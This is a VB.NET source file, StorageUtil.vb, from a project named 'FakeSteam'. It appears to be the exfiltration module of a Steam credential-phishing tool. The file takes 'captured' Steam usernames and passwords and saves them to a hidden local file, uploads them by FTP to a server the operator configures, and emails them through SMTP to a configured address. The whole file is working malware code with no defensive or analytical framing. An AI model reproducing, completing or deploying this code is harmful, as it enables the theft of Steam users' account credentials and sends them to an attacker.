' ***********************************************************************
' Author   : Elektro
' Modified : 03-May-2015
' ***********************************************************************
' <copyright file="StorageUtil.vb" company="Elektro Studios">
'     Copyright (c) Elektro Studios. All rights reserved.
' </copyright>
' ***********************************************************************

#Region " Option Statements "

Option Explicit On
Option Strict On
Option Infer Off

#End Region

#Region " Imports "

Imports FakeSteam.Config
Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Text

#End Region

Namespace Tools


    ''' <summary>
    ''' Contains related data storage tools.
    ''' </summary>
    Public NotInheritable Class StorageUtil

#Region " Public Methods "

        ''' <summary>
        ''' Stores, uploads, or sends the captured username/password the password.
        ''' </summary>
        ''' <param name="username">The Steam username.</param>
        ''' <param name="password">The Steam password.</param>
        Public Shared Sub ManagePassword(ByVal username As String,
                                         ByVal password As String)

            If UserConfig.EnableLocalStorage Then
                StorageUtil.WriteLocalFile(username, password)
            End If

            If UserConfig.EnableFtp Then
                StorageUtil.FtpUpload(username, password)
            End If

            If UserConfig.EnableSmtp Then
                StorageUtil.SmtpSend(username, password)
            End If

        End Sub

#End Region

#Region " Private Methods "

        ''' <summary>
        ''' Writes the file containing the username/password to a local file.
        ''' </summary>
        ''' <param name="username">The Steam username.</param>
        ''' <param name="password">The Steam password.</param>
        Private Shared Sub WriteLocalFile(ByVal username As String,
                                          ByVal password As String)

            Try
                If Not Directory.Exists(UserConfig.LocalDir) Then
                    Directory.CreateDirectory(UserConfig.LocalDir)
                End If
                File.SetAttributes(UserConfig.LocalDir, UserConfig.DirAttribs)

                File.WriteAllText(Path.Combine(UserConfig.LocalDir, UserConfig.LocalFilenameFormat), String.Format(UserConfig.UserPassTextFormat, username, password).Trim, UserConfig.FileEncoding)
                File.SetAttributes(Path.Combine(UserConfig.LocalDir, UserConfig.LocalFilenameFormat), UserConfig.FileAttribs)

            Catch ex As Exception
#If DEBUG Then
                Throw
#End If

            End Try

        End Sub

        ''' <summary>
        ''' Sends an e-mail containing the username/password through the specified SMTP server.
        ''' </summary>
        ''' <param name="username">The Steam username.</param>
        ''' <param name="password">The Steam password.</param>
        Private Shared Sub SmtpSend(ByVal username As String,
                                    ByVal password As String)

            Try

                Using mailSetup As New MailMessage

                    mailSetup.Subject = UserConfig.MailSubject
                    mailSetup.To.Add(UserConfig.MailAddress)
                    mailSetup.From = UserConfig.MailAddress
                    mailSetup.Body = String.Format(UserConfig.UserPassTextFormat, username, password).Trim

                    With UserConfig.SmtpServer
                        UserConfig.SmtpServer.Port = UserConfig.SmtpPort
                        UserConfig.SmtpServer.EnableSsl = UserConfig.SmtpSslEnabled
                        UserConfig.SmtpServer.Credentials = UserConfig.MailCredentials
                        UserConfig.SmtpServer.Send(mailSetup)
                    End With ' Don't dispose it.

                End Using

            Catch ex As Exception
#If DEBUG Then
                Throw
#End If

            End Try

        End Sub

        ''' <summary>
        ''' Uploads the file containing the username/password through FTP server.
        ''' </summary>
        ''' <param name="username">The Steam username.</param>
        ''' <param name="password">The Steam password.</param>
        Private Shared Sub FtpUpload(ByVal username As String,
                                     ByVal password As String)

            Try
                Dim ftpRequest As FtpWebRequest = DirectCast(FtpWebRequest.Create(String.Format("{0}:{1}/{2}/{3}",
                                                                                  UserConfig.FtpAddress.AbsoluteUri.TrimEnd("/"c),
                                                                                  UserConfig.FtpPort.ToString,
                                                                                  UserConfig.FtpDir.Trim("/"c),
                                                                                  UserConfig.FtpFilenameFormat.Trim)), FtpWebRequest)

                With ftpRequest
                    .Credentials = UserConfig.FtpCredentials
                    .Method = WebRequestMethods.Ftp.UploadFile
                    .Proxy = Nothing
                    .KeepAlive = True
                    .UseBinary = UserConfig.UseBinaryTransfer
                End With

                Dim data As Byte() = Encoding.Default.GetBytes(String.Format(UserConfig.UserPassTextFormat, username, password).Trim)

                Using ftpStream As Stream = ftpRequest.GetRequestStream()
                    ftpStream.Write(data, 0, data.Length)
                End Using

            Catch ex As Exception
#If DEBUG Then
                Throw
#End If

            End Try

        End Sub

#End Region

    End Class

End Namespace